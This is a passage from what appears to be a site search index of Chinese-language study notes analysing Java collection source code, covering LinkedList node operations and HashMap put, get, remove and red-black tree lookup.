<li>\u4e00\u822c\u60c5\u51b5\u4e0b,\u5f53\u6dfb\u52a0\u4e00\u4e2a\u5143\u7d20\u5bfc\u81f4\u9700\u8981\u6269\u5bb9\u662f,\u6269\u5bb9\u540e\u7684\u5927\u5c0f\u662f\u539f\u5927\u5c0f\u76841.5\u500d,\u8fd9\u4e5f\u5c31\u5bfc\u81f4\u7a7a\u767d\u7684\u7a7a\u95f4\u5269\u4f59\u8fc7\u591a\u3002\u56e0\u6b64\u5982\u679c\u4e0d\u5efa\u8bae\u4e00\u4e2aArrayList\u91cc\u9762\u7684\u6570\u636e\u8fc7\u591a,\u53ef\u4ee5\u8003\u8651\u6839\u636e\u4e00\u4e9b\u7279\u70b9\u5206\u7c7b,\u7136\u540e\u4f7f\u7528\u591a\u4e2aArrayList\u6765\u88c5\u8f7d\u6570\u636e\u3002\u6216\u8005\u7528<code>trimToSize()</code>\u51fd\u6570\u5c06\u7a7a\u767d\u7a7a\u95f4\u9664\u6389\u3002</li> <li>\u5982\u679c\u5bf9\u96c6\u5408\u662f\u4e00\u822c\u7684\u904d\u5386\uff0c\u5efa\u8bae\u4f7f\u7528<code>forEach()</code>\uff0c\u6027\u80fd\u66f4\u4f18\u3002</li> </ul>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#2-linkedlist","title":"2. LinkedList","text":""},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_3","title":"\u6e90\u7801\u5206\u6790","text":"<ul> <li>LinkedList\u662f\u53cc\u5411\u94fe\u8868\u548c\u53cc\u7aef\u961f\u5217\u7684\u5b9e\u73b0\u7c7b,\u4e5f\u5c31\u662f\u65e2\u6709\u94fe\u8868\u53c8\u6709\u961f\u5217\u7684\u7279\u6027.</li> </ul> <pre><code>//\u8fd9\u4e2a\u662fLinkedList\u91cc\u9762\u7684\u4e00\u4e2a\u79c1\u6709\u5185\u90e8\u7c7b.\nprivate static class Node&lt;E&gt; {\n    E item;\n    Node&lt;E&gt; next;\n    Node&lt;E&gt; prev;\n    Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) {\n        this.item = element;\n        this.next = next;\n        this.prev = prev;\n    }\n}\n</code></pre> <ul> <li> <p>LinkedList\u5bf9\u8c61\u4e5f\u6709\u4e00\u4e2asize\u6765\u6807\u5fd7\u94fe\u8868\u5f53\u524d\u7684\u5927\u5c0f,\u521d\u59cb\u4e3a0.</p> </li> <li> <p>LinkedList\u5bf9\u8c61\u5185\u90e8\u4e24\u4e2a\u7279\u6b8a\u7684Node\u5bf9\u8c61,first\u548clast,\u8fd9\u4e24\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u5c06\u6709\u4e9b\u64cd\u4f5c\u7684\u590d\u6742\u5ea6\u76f4\u63a5\u51cf\u534a</p> </li> </ul> <pre><code>//\u6839\u636e\u4e0b\u6807\u5b9a\u4f4d\u5143\u7d20\nNode&lt;E&gt; node(int index) {\n    if (index &lt; (size &gt;&gt; 1)) {    //\u4ece\u524d\u9762\u5f00\u59cb\n        Node&lt;E&gt; x = first;\n        for (int i = 0; i &lt; index; i++)\n            x = x.next;\n        return x;\n    } else {                  //\u4ece\u540e\u9762\u5f00\u59cb\n        Node&lt;E&gt; x = last;\n        for (int i = size - 1; i &gt; index; i--)\n            x = x.prev;\n        return x;\n    }\n}\n</code></pre> <ul> <li>LinkedList\u7684\u6dfb\u52a0\u64cd\u4f5c\u9ed8\u8ba4\u6dfb\u52a0\u5230\u94fe\u8868\u672b\u7aef.\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u6307\u5b9a\u5176\u4e0b\u6807,\u8fd9\u4e5f\u5c31\u662f\u8bf4\u94fe\u8868\u5185\u5143\u7d20\u7684\u987a\u5e8f\u4e0d\u662f\u6709\u5e8f\u7684,\u5bf9\u4e8e\u4e00\u822c\u7684\u6dfb\u52a0\u64cd\u4f5c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(1).</li> </ul> <pre><code>//add(E e)\u5185\u90e8\u9ed8\u8ba4\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5,addLast\u4e5f\u662f\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\nvoid linkLast(E e) {\n    final Node&lt;E&gt; l = last;\n    final Node&lt;E&gt; newNode = new Node&lt;&gt;(l, e, null);\n    last = newNode;\n    if (l == null)\n        first = newNode;\n    else\n        l.next = newNode;\n    size++;\n    modCount++;\n}\n//addFist\u8c03\u7528\u6b64\u65b9\u6cd5\nvoid linkBefore(E e, Node&lt;E&gt; succ) {\n    // assert succ != null;\n    final Node&lt;E&gt; pred = succ.prev;\n    final Node&lt;E&gt; newNode = new Node&lt;&gt;(pred, e, succ);\n    succ.prev = newNode;\n    if (pred == null)\n        first = newNode;\n    else\n        pred.next = newNode;\n    size++;\n    modCount++;\n}\n</code></pre> <ul> <li> <p><code>peek</code>\u548c<code>get</code>\u4e24\u79cd\u65b9\u5f0f\u7684\u5dee\u5f02: </p> </li> <li> <p>peek\u7ffb\u8bd1\u4e3a\u5077\u770b,peek\u4e0d\u4f1a\u629b\u51fa\u5f02\u5e38.\u540c\u7406\u8fd8\u6709<code>peekFirst</code>\u548c<code>peekLast</code></p> <pre><code>public E peek() {\n    final Node&lt;E&gt; f = first;\n    return (f == null) ? null : f.item;\n}\n</code></pre> </li> <li> <p>get\u5c31\u662f\u7d22\u8981,\u5982\u679c\u5bf9\u65b9\u6ca1\u6709,\u4ed6\u5c31\u4f1a\u62a5\u9519.\u540c\u7406\u8fd8\u6709<code>getFirst</code>\u548c<code>getLast</code></p> <pre><code>public E get(int index) {\n    checkElementIndex(index);\n    return node(index).item;\n}\n</code></pre> </li> <li> <p><code>clear</code>\u51fd\u6570\u5c31\u662f\u5c06\u6240\u6709\u8282\u70b9\u7684\u5173\u8054\u5168\u90e8\u5220\u9664,\u5e76\u4e14\u5c06\u8282\u70b9\u4e2d\u5bf9\u4e8evalue\u7684\u5e94\u7528\u4e5f\u5220\u6389,\u8fd9\u6837\u8fd9\u4e2a\u5bf9\u8c61\u5c31\u4f1a\u81ea\u52a8\u88abGC\u7cfb\u7edf\u56de\u6536.</p> </li> </ul> <pre><code>public void clear() {\n    for (Node&lt;E&gt; x = first; x != null; ) {\n        Node&lt;E&gt; next = x.next;\n        x.item = null;\n        x.next = null;\n        x.prev = null;\n        x = next;\n    }\n    first = last = null;\n    size = 0;\n    modCount++;\n}\n//\u4ece\u4e0a\u9762\u7684\u4ee3\u7801\u6211\u4eec\u53ef\u4ee5\u770b\u51fa,LinkedList\u662f\u7ebf\u7a0b\u4e0d\u5b89\u5168\u7684\n//\u6bd4\u5982\u5728clear\u662f\u542f\u52a8\u4e86\u4e00\u4e2aaddFirst\u64cd\u4f5c,\u4f46\u662faddFisrt\u64cd\u4f5c\u7684modCount\u81ea\u589e\u53c8\u6bd4clear\u7684\u5b8c,\u90a3\u4e48\u6700\u7ec8clear\u5c31\u6e05\u7406\u4e0d\u5e72\u51c0\u4e86\n</code></pre> <ul> <li><code>remove</code>\u64cd\u4f5c\u5176\u5b9e\u548c<code>clear</code>\u7684\u5185\u5bb9\u76f8\u4f3c,\u4e5f\u662f\u5c06\u8282\u70b9\u7684\u6240\u6709\u5f15\u7528\u5220\u9664,\u4ea4\u7ed9GC\u81ea\u52a8\u56de\u6536.\u4f46\u662f\u4ed6\u53ea\u4f1a\u5220\u9664\u6389\u94fe\u8868\u4e2d\u7684\u4e00\u4e2a\u8282\u70b9,\u800cLinkedList\u4e2d\u53ef\u4ee5\u6709\u91cd\u590d\u7684\u5bf9\u8c61,\u4e5f\u5c31\u662f\u8bf4\u65e0\u6cd5\u5220\u9664\u5168\u90e8\u7b26\u5408\u6761\u4ef6\u7684\u5143\u7d20\u8282\u70b9,\u5982\u679c\u60f3\u5220\u9664\u5168\u90e8\u7b49\u4e8eo\u7684\u5143\u7d20\u8282\u70b9,\u53ef\u4ee5\u4e00\u76f4\u5220\u9664\u76f4\u5230\u8fd4\u56de\u503c\u4e3afalse\u4e3a\u6b62.</li> </ul> <pre><code>public boolean remove(Object o) {\n    if (o == null) {\n        for (Node&lt;E&gt; x = first; x != null; x = x.next) {\n            if (x.item == null) {\n                unlink(x);\n                return true;\n            }\n        }\n    } else {\n        for (Node&lt;E&gt; x = first; x != null; x = x.next) {\n            if (o.equals(x.item)) {\n                unlink(x);\n                return true;\n            }\n        }\n    }\n    return false;\n}\n</code></pre>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_4","title":"\u603b\u7ed3","text":"<ul> <li>LinkedList\u7684\u5143\u7d20\u7684\u6dfb\u52a0\u5220\u9664\uff0c\u4e0d\u662f\u901a\u8fc7\u6570\u7ec4\u6765\u5b8c\u6210\u7684\uff0c\u6240\u4ee5\u6548\u7387\u5f88\u9ad8.</li> <li>ArrayList\u548cLinkedList\u6bd4\u8f83</li> </ul> \u5e95\u5c42\u7ed3\u6784 \u589e\u5220\u7684\u6548\u7387 \u6539\u67e5\u7684\u6548\u7387 ArrayList \u53ef\u53d8\u6570\u7ec4 \u8f83\u4f4e\uff0c\u6570\u7ec4\u6269\u5bb9 \u8f83\u9ad8 LinkedList \u53cc\u5411\u94fe\u8868 \u8f83\u9ad8\uff0c\u94fe\u8868\u8ffd\u52a0 \u8f83\u4f4e <ul> <li> <p>\u5982\u4f55\u9009\u62e9ArrayList\u548cLinkedList:(\u56e0\u4e3a\u662f\u4e24\u4e2a\u90fd\u662f\u7ebf\u7a0b\u4e0d\u5b89\u5168\u7684\uff0c\u6240\u4ee5\u5728\u5355\u7ebf\u7a0b\u7684\u60c5\u51b5\u4e0b\u8003\u8651\u8fd9\u4e24\u79cd\u96c6\u5408\uff09</p> </li> <li> <p>\u5982\u679c\u6211\u4eec\u6539\u67e5\u7684\u64cd\u4f5c\u591a\uff0c\u9009\u62e9ArrayList.</p> </li> <li> <p>\u5982\u679c\u6211\u4eec\u589e\u5220\u7684\u64cd\u4f5c\u591a\uff0c\u9009\u62e9LinkedList.</p> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u5728\u7a0b\u5e8f\u4e2d\uff0c80%-90%\u90fd\u662f\u67e5\u8be2\uff0c\u56e0\u6b64\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\u4f1a\u9009\u62e9ArrayList</p> </li> </ul>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#3-hashmap","title":"3. HashMap","text":""},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_5","title":"\u6e90\u7801\u5206\u6790","text":"<ul> <li>HashMap\u53ef\u4ee5\u5b58\u50a8\u4efb\u4f55\u7c7b\u578b\u7684\u6570\u636e(\u57fa\u7840\u7c7b\u578b\u4f1a\u81ea\u52a8\u88c5\u5305),\u6570\u636e\u5728\u5e95\u5c42\u7684\u8868\u73b0\u5f62\u5f0f\u90fd\u662fkey-value\u7684\u65b9\u5f0f.\u5e95\u5c42\u5c06\u6570\u636e\u5c01\u88c5\u5728\u4e00\u4e2aNode\u7c7b\u578b\u7684\u5bf9\u8c61\u4e2d,\u540c\u65f6\u5f62\u6210\u4e00\u4e2a\u5355\u5411\u94fe\u8868key\u548cvalue\u53ef\u4ee5\u4f7f\u4efb\u610f\u503c,\u5305\u62ec<code>null</code>\uff0c\u800c\u6240\u6709Node\u90fd\u5b58\u50a8\u5728HashMap\u5bf9\u8c61\u4e2d\u7684<code>table</code>\u5b57\u6bb5\u4e2d\u3002</li> </ul> <pre><code>static class Node&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; {\n    final int hash;\n    final K key;\n    V value;\n    Node&lt;K,V&gt; next;\n\n    Node(int hash, K key, V value, Node&lt;K,V&gt; next) {\n      this.hash = hash;\n      this.key = key;\n      this.value = value;\n      this.next = next;\n  }\n}\n</code></pre> <ul> <li>HashMap\u5e95\u5c42\u5c06\u6570\u636e\u5c01\u88c5\u5728\u4e00\u4e2aNode\u4e2d,\u5e76\u4e14\u5c06\u5176\u5b58\u653e\u5728<code>Node[] table</code>\u6570\u7ec4\u4e2d,\u6bcf\u4e00\u4e2ahash\u503c\u5bf9\u5e94\u4e00\u4e2a\u4e0b\u6807,\u67e5\u627e\u65f6\u53ea\u9700\u8981\u8ba1\u7b97key\u7684hash\u503c,\u5373\u53ef\u5b9a\u4f4d\u5230table\u4e2d\u7684\u4f4d\u7f6e.\u4f46\u662f\u4e0d\u4ec5\u6709\u94fe\u8868,\u8fd8\u6709\u7ea2\u9ed1\u6811(JDK8\u5f00\u59cb\u7684\u65b0\u7279\u6027)</li> </ul> <ul> <li> <p>table\u7684\u9ed8\u8ba4\u521d\u59cb\u5927\u5c0f\u662f16(DEFAULT_INITIAL_CAPACITY).\u540c\u65f6\u5f15\u5165\u4e00\u4e2a\u52a0\u8f7d\u56e0\u5b50(loadFactor)\u548c\u9608\u503c(threshold)\u7684\u6982\u5ff5.\u5f53\u6570\u7ec4\u4e2d</p> </li> <li> <p>capacity:\u5bb9\u91cf,\u4e5f\u5c31\u662ftable\u6570\u7ec4\u7684\u957f\u5ea6,\u6570\u7ec4\u5bb9\u91cf\u4e00\u5b9a\u662f2\u7684\u6307\u6570\u500d.</p> </li> <li>\u9608\u503c:\u5f53HashMap\u4e2d\u7684\u952e\u503c\u5bf9\u6570\u91cf\u8d85\u8fc7\u9608\u503c\u662f,HashMap\u4f1a\u81ea\u52a8\u8fdb\u884c\u6269\u5bb9,\u6269\u5bb9\u540e\u7684\u5bb9\u91cf\u4f1a\u53d8\u6210\u539f\u5bb9\u91cf\u7684\u4e24\u500d.</li> <li>\u52a0\u8f7d\u56e0\u5b50:\u9608\u503c\u5927\u5927\u5c0f\u5c31\u7b49\u4e8e\u5bb9\u91cf\u4e58\u4ee5\u52a0\u8f7d\u56e0\u5b50,\u6bcf\u6b21<code>resize</code>\u4e4b\u540e,\u9608\u503c\u90fd\u4f1a\u6839\u636e\u5bb9\u91cf\u548c\u52a0\u8f7d\u56e0\u5b50\u91cd\u65b0\u8ba1\u7b97.</li> <li> <p>\u8bbe\u7f6e\u9608\u503c\u4e3b\u8981\u662f\u4e3a\u4e86\u63d0\u524d\u51c6\u5907\u6269\u5bb9,\u5c3d\u91cf\u51cf\u5c11hash\u78b0\u649e,\u540c\u65f6\u56e0\u4e3a\u6570\u7ec4\u7684\u5bb9\u91cf\u4e00\u5b9a\u662f2\u7684\u6307\u6570\u500d,\u56e0\u6b64\u5728\u6269\u5bb9\u7684\u65f6\u5019,\u539f\u6570\u636e\u670950%\u7684\u6982\u7387\u4e0d\u9700\u8981\u79fb\u52a8,\u800c\u8fd9\u5c31\u6709\u65b0\u589e\u7684\u9ad8\u4f4d\u51b3\u5b9a.\u56e0\u4e3a\u6bcf\u4e2ahash\u5728table\u4e2d\u7684\u4f4d\u7f6e\u662f\u7531hash\u503c\u548ccapacity\u5927\u5c0f\u8fdb\u884c \u6309\u4f4d\u4e0e\u8fd0\u7b97\u5f97\u6765\u7684.\u662f\u5426\u9700\u8981\u4e00\u5b9a\u53ea\u9700\u8981\u65b0\u589e\u7684\u9ad8\u4f4d\u4f4d0\u5373\u53ef.</p> </li> <li> <p>\u53ca\u65f6\u5c3d\u53ef\u80fd\u7684\u907f\u514d\u4e86hash\u78b0\u649e,\u4f46\u662f\u78b0\u649e\u8fd8\u662f\u6709\u53ef\u80fd\u53d1\u751f.\u5982\u679c\u78b0\u649e\u8282\u70b9\u6bd4\u8f83\u5c0f,\u5c31\u4f1a\u6309\u7167\u94fe\u8868\u7684\u65b9\u5f0f\u5b58\u50a8\u6570\u636e,\u800c\u5f53\u78b0\u649e\u8282\u70b9\u6570\u91cf\u6bd4\u8f83\u5927\u65f6(\u4e00\u822c\u662f8),HashMap\u5c31\u662f\u628a\u4ed6\u7684\u7ed3\u6784\u8c03\u6574\u6210\u6811\u72b6\u8282\u70b9.(\u5f53\u524d\u7248\u672c\u4f7f\u7528\u7684\u662f\u7ea2\u9ed1\u6811)</p> </li> </ul> <p>HashMap\u4e4bTreeNode\uff08\u7ea2\u9ed1\u6811\uff09\u6e90\u7801\u5206\u6790_removetreenode( ) untreeify\u6761\u4ef6_\u5e74\u8f7b\u7684\u53d4\u53d4\u7684\u535a\u5ba2-CSDN\u535a\u5ba2</p> <pre><code>static final class TreeNode&lt;K,V&gt; extends LinkedHashMap.Entry&lt;K,V&gt; {\n    TreeNode&lt;K,V&gt; parent;  //\u7236\u8282\u70b9\n    TreeNode&lt;K,V&gt; left;      \n    TreeNode&lt;K,V&gt; right;\n    TreeNode&lt;K,V&gt; prev;    // \u5f53\u505a\u94fe\u8868\u8fde\u63a5\u8282\u70b9\u65f6\u4f7f\u7528\u3002\n    boolean red;\n\n    TreeNode(int hash, K key, V val, Node&lt;K,V&gt; next) {\n        super(hash, key, val, next);\n    }\n}\n</code></pre> <ul> <li><code>put</code>\u51fd\u6570\u4f1a\u5224\u65ad\u78b0\u649e\u68c0\u6d4b\u662f\u5426\u9700\u8981\u91cd\u65b0\u8c03\u6574\u5927\u5c0f,\u662f\u5426\u9700\u8981\u8c03\u6574\u4e3a\u6811\u72b6\u7ed3\u6784\u7b49.</li> </ul> <pre><code>final V putVal(int hash, K key, V value, boolean onlyIfAbsent,\n               boolean evict) {\n    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i;\n    if ((tab = table) == null || (n = tab.length) == 0)          //\u521d\u59cb\u72b6\u6001,\u6570\u7ec4\u4e3a\u7a7a,\u9700\u8981\u521d\u59cb\u5316\n        n = (tab = resize()).length;\n    if ((p = tab[i = (n - 1) &amp; hash]) == null)                   //\u5982\u679c\u8ba1\u7b97\u51fa\u4e0b\u6807\u6240\u5728\u7684\u4f4d\u7f6e\u4e3a\u7a7a,\u5219\u76f4\u63a5\u653e\u5165\n        tab[i] = newNode(hash, key, value, null);\n    else {\n        Node&lt;K,V&gt; e; K k;\n        if (p.hash == hash &amp;&amp;                //\u5224\u65adkey\u662f\u5426\u76f8\u7b49\u7684\u4f5c\u7528,\u5148\u901a\u8fc7hash\u5224\u65ad,\u53ef\u4ee5\u63d0\u9ad8\u6027\u80fd\n            ((k = p.key) == key || (key != null &amp;&amp; key.equals(k))))\n            e = p;                   \n        else if (p instanceof TreeNode)      //\u7ea2\u9ed1\u6811\u7684\u5b58\u653e\u65b9\u5f0f,\u56e0\u4e3a\u6811\u548c\u94fe\u8868\u7684\u904d\u5386\u65b9\u5f0f\u4e0d\u540c,\u56e0\u6b64\u5355\u72ec\u5904\u7406\n            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value);\n        else {                               //\u94fe\u8868\u7684\u5904\u7406\u65b9\u5f0f\n            for (int binCount = 0; ; ++binCount) {\n                if ((e = p.next) == null) {  //\u94fe\u8868\u904d\u5386,\u540c\u65f6\u4f7f\u7528binCount\u8ba1\u6570,\u7528\u6765\u5224\u65ad\u78b0\u649e\u7684\u56e0\u5b50\u6570\n                    p.next = newNode(hash, key, value, null);  // \u5411\u94fe\u8868\u672b\u7aef\u63d2\u5165\u76ee\u6807\u6570\u636e\n                    if (binCount &gt;= TREEIFY_THRESHOLD - 1)     // \u5982\u679c\u8d85\u8fc7\u9608\u503c,\u5c06\u94fe\u8868\u53d8\u6210\u7ea2\u9ed1\u6811\n                        treeifyBin(tab, hash);\n                    break;\n                }\n                if (e.hash == hash &amp;&amp;        //\u5224\u65adkey\u662f\u5426\u76f8\u7b49\n                    ((k = e.key) == key || (key != null &amp;&amp; key.equals(k))))\n                    break;\n                p = e;\n            }\n        }\n        if (e != null) {                     //\u5b58\u5728\u76f8\u540c\u7684key\n            V oldValue = e.value;\n            if (!onlyIfAbsent || oldValue == null)\n                e.value = value;             //\u66ff\u6362\u64cd\u4f5c\n            afterNodeAccess(e);              //\u7a7a\u63a5\u53e3    \n            return oldValue;\n        }\n    }\n    ++modCount;                              //\u6570\u636e\u7684\u7ed3\u6784\u53d1\u751f\u6539\u53d8\u65f6\u6267\u884c,\u56e0\u6b64\u4e0a\u9762\u4ec5\u4ec5\u662f\u66ff\u6362\u64cd\u4f5c,\u4e0d\u9700\u8981\u81ea\u589e\n    if (++size &gt; threshold)                  //\u9608\u503c\u5224\u65ad,\u91cd\u65b0\u8c03\u6574\u5927\u5c0f\n        resize();\n    afterNodeInsertion(evict);               //\u7a7a\u63a5\u53e3\n    return null;\n}\n</code></pre> <ul> <li><code>get</code>\u51fd\u6570\u4f1a\u8ba1\u7b97\u51fakey\u5bf9\u5e94\u7684hash\u503c,\u7136\u540e\u6839\u636ehash\u503c\u5728\u8868\u4e2d\u67e5\u627e</li> </ul> <pre><code>final Node&lt;K,V&gt; getNode(Object key) {\n    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; int n, hash; K k;\n    if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp;          //\u7a7a\u8868\u5224\u65ad\n        (first = tab[(n - 1) &amp; (hash = hash(key))]) != null) {    //\u8868\u4e2d\u7684\u7a7a\u503c\u5224\u65ad\n\n        //============key\u67e5\u627e=============\n        if (first.hash == hash &amp;&amp;                                 //\u8fd9\u91cc\u5bf9\u5355\u72ec\u7b2c\u4e00\u4e2a\u503c\u8fdb\u884c\u5224\u65ad\n            ((k = first.key) == key || (key != null &amp;&amp; key.equals(k))))\n            return first;\n        if ((e = first.next) != null) {                           //\u904d\u5386\u67e5\u627e\n            if (first instanceof TreeNode)                        //\u5224\u65ad\u7ed3\u6784,\u5982\u679c\u662f\u6811\u5c31\u8fdb\u884c\u7ea2\u9ed1\u6811\u67e5\u627e\n                return ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key);\n            do {\n                if (e.hash == hash &amp;&amp;\n                    ((k = e.key) == key || (key != null &amp;&amp; key.equals(k))))\n                    return e;\n            } while ((e = e.next) != null);\n        }\n    }\n    return null;\n}\n</code></pre> <ul> <li><code>remove</code>\u51fd\u6570</li> </ul> <pre><code>final Node&lt;K,V&gt; removeNode(int hash, Object key, Object value,\n                           boolean matchValue, boolean movable) {\n    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, index;\n    if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp;           //\u7a7a\u8868\u5224\u65ad\n        (p = tab[index = (n - 1) &amp; hash]) != null) {               //\u7a7a\u503c\u5224\u65ad\n        Node&lt;K,V&gt; node = null, e; K k; V v;\n        if (p.hash == hash &amp;&amp;                                      //\u5bf9\u7b2c\u4e00\u4e2a\u8282\u70b9key\u7684\u76f8\u7b49\u5224\u65ad\n            ((k = p.key) == key || (key != null &amp;&amp; key.equals(k))))\n            node = p;\n        else if ((e = p.next) != null) {\n            if (p instanceof TreeNode)                             //\u6811\u72b6\u7ed3\u6784\u7684\u65b9\u5f0f\u83b7\u53d6\n                node = ((TreeNode&lt;K,V&gt;)p).getTreeNode(hash, key);\n            else {\n                do {                                               //\u94fe\u72b6\u7ed3\u6784\u7684\u904d\u5386\n                    if (e.hash == hash &amp;&amp;\n                        ((k = e.key) == key ||\n                         (key != null &amp;&amp; key.equals(k)))) {\n                        node = e;\n                        break;\n                    }\n                    p = e;\n                } while ((e = e.next) != null);\n            }\n        }\n        if (node != null &amp;&amp; (!matchValue || (v = node.value) == value ||   //\u5bf9\u4e8e\u5220\u9664\u7684\u6761\u4ef6\u5224\u65ad\n                             (value != null &amp;&amp; value.equals(v)))) {\n            if (node instanceof TreeNode)\n                ((TreeNode&lt;K,V&gt;)node).removeTreeNode(this, tab, movable);\n            else if (node == p)\n                tab[index] = node.next;\n            else\n                p.next = node.next;\n            ++modCount;\n            --size;\n            afterNodeRemoval(node);\n            return node;\n        }\n    }\n    return null;\n}\n</code></pre> <ul> <li> <p>\u524d\u9762\u5927\u91cf\u63d0\u5230\u4e86\u7ea2\u9ed1\u6811,\u90a3\u4e48\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u7ea2\u9ed1\u6811\u7684\u67e5\u627e\u3001\u63d2\u5165\u548c\u5220\u9664\u5427</p> </li> <li> <p><code>putTreeVal</code>\u63d2\u5165\u8282\u70b9(\u8fd9\u91cc\u53ea\u662f\u627e\u5230\u5bf9\u5e94\u7684\u8282\u70b9\u4ea4\u7ed9\u4e0a\u5c42,\u5177\u4f53\u7684\u503c\u653e\u5165\u7531\u4e0a\u5c42\u8d1f\u8d23,\u56e0\u4e3a\u6709\u53ef\u80fd\u6709\u4e00\u4e9b\u7b56\u7565\u9700\u8981\u4f7f\u7528)</p> <pre><code>final TreeNode&lt;K,V&gt; putTreeVal(HashMap&lt;K,V&gt; map, Node&lt;K,V&gt;[] tab,\n                               int h, K k, V v) {\n    Class&lt;?&gt; kc = null;\n    boolean searched = false;\n    TreeNode&lt;K,V&gt; root = (parent != null) ? root() : this;           //\u5b9a\u4f4d\u5230\u6839\u8282\u70b9\n    for (TreeNode&lt;K,V&gt; p = root;;) {\n        int dir, ph; K pk;\n        if ((ph = p.hash) &gt; h)          //\u6839\u636ehash\u503c\u5f97\u5927\u5c0f\u5224\u65ad\u65b9\u5411,\u8bf4\u660ehashmap\u4e2d\u7684\u7ea2\u9ed1\u6811\u7684\u7d22\u5f15\u662fhash\n            dir = -1;\n        else if (ph &lt; h)\n            dir = 1;\n        else if ((pk = p.key) == k || (k != null &amp;&amp; k.equals(pk)))   //\u5224\u65adkey\u662f\u5426\u76f8\u7b49\n            return p;                   //\u627e\u5230\u4e86\u76f8\u540c\u7684key,\u76f4\u63a5\u5c06\u8be5\u8282\u70b9\u8fd4\u56de\n        else if ((kc == null &amp;&amp;\n                  (kc = comparableClassFor(k)) == null) ||\n                 (dir = compareComparables(kc, k, pk)) == 0) {       //\u5982\u679ckey\u662f\u65e0\u6cd5\u6bd4\u8f83\u7684\n            if (!searched) {                                         //\u5982\u679c\u8fd8\u6ca1\u6709\u627e\u5230\n                TreeNode&lt;K,V&gt; q, ch;                                 \n                searched = true;                                     //\u8ba4\u4e3a\u627e\u5230\u4e86,\u6253\u4e2a\u6807\u8bb0\n                if (((ch = p.left) != null &amp;&amp;\n                     (q = ch.find(h, k, kc)) != null) ||\n                    ((ch = p.right) != null &amp;&amp;\n                     (q = ch.find(h, k, kc)) != null))               //\u5bf9\u5de6\u53f3\u5206\u652f\u641c\u7d22\n                    return q;\n            }\n            dir = tieBreakOrder(k, pk);  //\u6309\u7167\u7279\u5b9a\u65b9\u5f0f\u751f\u6210\u987a\u5e8f(\u7c7b\u540d\u6216\u8005hash\u6bd4\u8f83)\n        }\n        TreeNode&lt;K,V&gt; xp = p;\n        if ((p = (dir &lt;= 0) ? p.left : p.right) == null) {          //\u7ea2\u9ed1\u6811\u5230\u8fbe\u53f6\u5b50\u7ed3\u70b9,\u8c03\u6574\u6811\u7684\u7ed3\u6784\n            Node&lt;K,V&gt; xpn = xp.next;\n            TreeNode&lt;K,V&gt; x = map.newTreeNode(h, k, v, xpn);\n            if (dir &lt;= 0)\n                xp.left = x;\n            else\n                xp.right = x;\n            xp.next = x;\n            x.parent = x.prev = xp;\n            if (xpn != null)\n                ((TreeNode&lt;K,V&gt;)xpn).prev = x;\n            moveRootToFront(tab, balanceInsertion(root, x));\n            return null;\n        }\n    }\n}\n</code></pre> </li> <li> <p><code>find</code>\u51fd\u6570\u7528\u6765\u67e5\u627e\u5bf9\u5e94\u7684\u8282\u70b9</p> <pre><code>final TreeNode&lt;K,V&gt; find(int h, Object k, Class&lt;?&gt; kc) {\n    TreeNode&lt;K,V&gt; p = this;\n    do {\n        int ph, dir; K pk;\n        TreeNode&lt;K,V&gt; pl = p.left, pr = p.right, q;\n        if ((ph = p.hash) &gt; h)                                          //\u5de6\u5206\u652f\n            p = pl;                         \n        else if (ph &lt; h)                                                //\u53f3\u5206\u652f\n            p = pr;                                                    \n        else if ((pk = p.key) == k || (k != null &amp;&amp; k.equals(pk)))      //\u547d\u4e2d\n            return p;                       \n        else if (pl == null)                                            //\u5de6\u7a7a\u5411\u53f3\u504f\n            p = pr;\n        else if (pr == null)                                            //\u6709\u7a7a\u5411\u5de6\u504f\n            p = pl;\n        else if ((kc != null ||                                         //\u4e24\u8fb9\u90fd\u4e0d\u4e3a\u7a7a,\u4f46\u662f\u65e0\u6cd5\u6bd4\u8f83\n                  (kc = comparableClassFor(k)) != null) &amp;&amp;\n                 (dir = compareComparables(kc, k, pk)) != 0)\n            p = (dir &lt; 0) ? pl : pr;                                    //\u901a\u8fc7\u81ea\u5df1\u7684\u6bd4\u8f83\u65b9\u5f0f\u6bd4\u8f83\u5e76\u504f\u79fb\n        else if ((q = pr.find(h, k, kc)) != null)                       //\u9012\u5f52\u5411\u53f3\u8fb9\u5bfb\u627e\n            return q;\n        else\n            p = pl;                                                     //\u9ed8\u8ba4\u5411\u5de6\u504f\u79fb\n    } while (p != null);\n    return null;\n}\n</code></pre> </li> <li> <p>HashSet\u662f\u901a\u8fc7HashMap\u5b9e\u73b0\u7684\uff0c\u5229\u7528\u7684\u5c31\u662fHashMap\u7684K\u552f\u4e00\u6027\uff0c\u800cLinkedHashSet\u53c8\u662f\u7ee7\u627fHashSet\u7684\uff0c\u56e0\u6b64\u8fd9\u51e0\u4e2a\u5bb9\u5668\u5e95\u5c42\u90fd\u662f\u57fa\u4e8eHashMap\u7684</p> <p></p> <p></p> </li> </ul>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_6","title":"\u603b\u7ed3","text":"<ul> <li> 